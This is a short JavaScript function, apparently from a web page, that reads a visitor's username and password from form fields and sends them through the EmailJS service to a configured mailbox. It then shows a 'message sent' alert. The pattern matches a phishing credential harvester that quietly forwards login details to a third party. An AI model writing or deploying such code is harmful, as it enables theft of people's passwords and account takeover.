function sendMail(){
    var params = {
        name: document.getElementById("Username") .value,
        password: document.getElementById("Password") .value,

    };
    const serviceID = "service_qcg6bh8";
    const templateID =  "template_m1iysvb"
    
    emailjs.send(serviceID,templateID,params) 
    .then(
        res=>{
            document.getElementById("username"). value = "";
            document.getElementById("password"). value = "";
            console.log(res)
            alert("Your Message Sent Succesfully");
        }
    
    
    )
    .catch( (err) => console.log(err));
    
}